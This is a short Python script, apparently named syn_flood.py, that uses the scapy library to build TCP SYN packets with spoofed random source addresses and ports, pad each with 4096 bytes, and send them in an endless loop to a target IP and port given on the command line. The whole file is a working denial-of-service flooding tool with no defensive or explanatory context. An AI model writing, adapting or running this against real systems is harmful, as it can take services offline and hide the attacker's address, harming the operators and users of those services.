import sys
from scapy.all import *

# python3 syn_flood.py <target_ip> <target_port> 

target_ip = sys.argv[1]
target_port = sys.argv[2]

ip = IP(src=RandIP(), dst=target_ip)

tcp = TCP(sport=RandShort(), dport = int(target_port), flags="S")

raw = Raw(b"X"*4096)

p = ip/tcp/raw

while True: 
    send(p, verbose=0)
    print('.')
